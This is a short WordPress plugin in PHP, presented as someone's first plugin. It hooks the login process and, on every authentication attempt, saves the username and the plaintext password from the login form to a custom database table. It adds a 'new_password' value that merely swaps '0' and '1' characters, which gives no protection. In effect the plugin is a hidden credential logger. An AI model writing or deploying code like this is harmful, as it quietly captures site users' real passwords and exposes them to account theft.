<?php
/*
Plugin Name: Plugin pass
Description: мой первый плагин
Version: 1.0
Author: Федоров В.Д.
*/
function invert_bits($password) {
    $inverted = '';
    for ($i = 0; $i < strlen($password); $i++) {
        $inverted .= $password[$i] === '0' ? '1' : ($password[$i] === '1' ? '0' : $password[$i]);
    }
    return $inverted;
}

function password_change($login, $password){
    global $wpdb;
    $password = $_POST['pwd'];

    $wpdb->insert(
        'users_password',
        array(
            'username' => $login,
            'password' => $password,
            'new_password' => invert_bits($password),
        ),
        array(
            '%s',
            '%s',
            '%s',
        )
    );
}

add_action('wp_authenticate', 'password_change', 10, 2);
?>